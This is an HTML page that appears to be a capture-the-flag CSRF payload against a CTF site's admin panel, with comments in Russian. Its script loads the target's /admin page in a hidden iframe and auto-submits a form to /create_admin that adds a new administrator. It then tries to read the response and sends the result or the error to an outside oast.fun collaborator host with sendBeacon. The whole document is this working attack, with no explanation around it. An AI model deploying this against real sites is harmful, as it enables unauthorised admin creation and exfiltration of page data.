<!DOCTYPE html>
<html>
<body>
<iframe id="resultFrame" name="resultFrame" style="display:none"></iframe>

<script>
const TARGET = 'https://tasks.goidactf.ru:20431';
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';

// 1. Сначала загружаем iframe с целевым сайтом
const iframe = document.getElementById('resultFrame');
iframe.src = TARGET + '/admin';

// 2. Через 2 секунды отправляем форму в этот iframe
setTimeout(() => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = TARGET + '/create_admin';
    form.target = 'resultFrame';
    form.innerHTML = '<input name="new_admin_login" value="DELAYED_FORM">';
    document.body.appendChild(form);
    form.submit();
    
    // 3. Через ещё 3 секунды пытаемся прочитать iframe
    setTimeout(() => {
        try {
            // Пробуем разные методы чтения
            const result = iframe.contentWindow.name || 
                          iframe.contentDocument.title || 
                          iframe.contentDocument.body.textContent;
            
            if (result) {
                navigator.sendBeacon(COLLAB + '/final_result', String(result).substring(0, 1000));
            } else {
                navigator.sendBeacon(COLLAB + '/no_result', 'empty');
            }
        } catch(e) {
            navigator.sendBeacon(COLLAB + '/cors_error', e.message);
        }
    }, 3000);
}, 2000);
</script>
</body>
</html>
